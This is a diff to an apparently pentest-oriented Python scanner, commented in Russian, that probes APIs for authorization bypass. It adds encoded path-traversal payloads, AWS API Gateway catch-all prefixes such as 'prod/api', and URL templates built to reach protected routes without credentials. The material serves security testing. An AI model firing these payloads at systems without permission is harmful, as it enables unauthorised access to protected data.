@@ -542,6 +542,11 @@ def check_cve_2025_29927(url: str, timeout: int, verify_ssl: bool, base_headers:
 # атаки как раз в том, что API Gateway/сервер декодирует их позже, чем происходит
 # проверка авторизации по маршруту.
 PROXY_BYPASS_PAYLOADS = [
+    "",  # прямая подстановка без обфускации - нужна для по-настоящему открытых
+         # catch-all ресурсов (например AWS API Gateway {proxy+} с Auth=None),
+         # где авторизации нет вовсе и никакой traversal-трюк не требуется;
+         # закодированный '../' в остальных payload'ах иногда ломает роутинг
+         # на уровне приложения (backend получает мусор вместо реального пути)
     "%2e%2e/",
     "%2e%2e%2f",
     "..%2f",
@@ -573,6 +578,18 @@ COMMON_PROXY_PREFIXES = [
     "static",
     "assets",
     "health",
+    # Типичный анти-паттерн AWS API Gateway: catch-all ресурс {proxy+} (например
+    # /prod/api/{proxy+}), у которого Auth=None, смонтированный на тот же бэкенд,
+    # что и остальные (защищённые) роуты. Раз он открыт целиком без authorizer'а,
+    # traversal-payload здесь не обязателен - достаточно подставить в {payload}{path}
+    # реальный путь (payload может быть и пустым, но т.к. шаблон уже требует
+    # {payload}, отработают все 9 вариантов - в т.ч. с payload="../", что backend
+    # обычно просто съедает как часть пути). Название stage - самое частое: prod.
+    "prod/api",
+    "dev/api",
+    "test/api",
+    "stage/api",
+    "qa/api",
 ]
 
 
@@ -580,16 +597,30 @@ def build_auto_proxy_bypass_pairs(targets: list[str], paths: list[str]) -> list[
     """Автоматически генерирует пары (прямой_URL, шаблон_обхода) для КАЖДОЙ комбинации
     таргет x путь x захардкоженный публичный префикс (COMMON_PROXY_PREFIXES), без
     необходимости вручную писать --proxy-bypass-map. Payload-и подставляются позже,
-    в check_proxy_bypass_pair, из PROXY_BYPASS_PAYLOADS."""
+    в check_proxy_bypass_pair, из PROXY_BYPASS_PAYLOADS.
+
+    Многие префиксы сами содержат 'api' (api/swagger, prod/api и т.п.). Если путь из
+    --paths ТОЖЕ начинается с 'api/' (частый случай - в файле путей обычно пишут полный
+    путь вида /api/v1/users), прямая конкатенация даёт задвоенное 'api/api/...' после
+    traversal (одна '..' убирает только последний сегмент префикса, а не оба).
+    Поэтому для путей на 'api/' дополнительно генерируется вариант БЕЗ этого префикса -
+    он корректно ложится и на case 'api/swagger' (одна '..' поднимает ровно до уровня
+    api/), и на case 'prod/api' (весь путь этого мнимого 'api/' и не подразумевает)."""
     pairs = []
     for target in targets:
         base = target.rstrip("/")
         for path in paths:
             p = path.lstrip("/")
             direct_url = f"{base}/{p}"
+
+            path_variants = {p}
+            if p.startswith("api/"):
+                path_variants.add(p[len("api/"):])
+
             for prefix in COMMON_PROXY_PREFIXES:
-                template = f"{base}/{prefix}/{{payload}}{p}"
-                pairs.append((direct_url, template))
+                for p_variant in path_variants:
+                    template = f"{base}/{prefix}/{{payload}}{p_variant}"
+                    pairs.append((direct_url, template))
     return pairs
 
 
@@ -1073,8 +1104,10 @@ def main():
     parser.add_argument("-t", "--timeout", type=int, default=10, help="Таймаут запроса в секундах (по умолчанию 10)")
     parser.add_argument("-w", "--workers", type=int, default=10, help="Количество параллельных потоков (по умолчанию 10)")
     parser.add_argument("-m", "--method", default="GET", choices=["GET", "HEAD", "POST"], help="HTTP метод (по умолчанию GET; для HEAD тело обычно будет 0 байт)")
-    parser.add_argument("-o", "--output", help="Путь для сохранения НАХОДОК (только подтверждённые обходы/уязвимости, "
-                                                "не все проверки подряд) в JSON. Пишется инкрементально по ходу выполнения")
+    parser.add_argument("-o", "--output", default="auth_results.json",
+                         help="Путь для сохранения НАХОДОК (только подтверждённые обходы/уязвимости, "
+                              "не все проверки подряд) в JSON. Пишется инкрементально по ходу выполнения. "
+                              "По умолчанию auth_results.json (в текущей директории)")
     parser.add_argument("--no-verify-ssl", action="store_true", help="Отключить проверку SSL сертификатов")
     parser.add_argument("--header", action="append", default=[], help="Дополнительный заголовок вида 'Key: Value' (можно указывать несколько раз)")
     parser.add_argument("--fail-only", action="store_true", help="Выводить в консоль только неуспешные проверки")
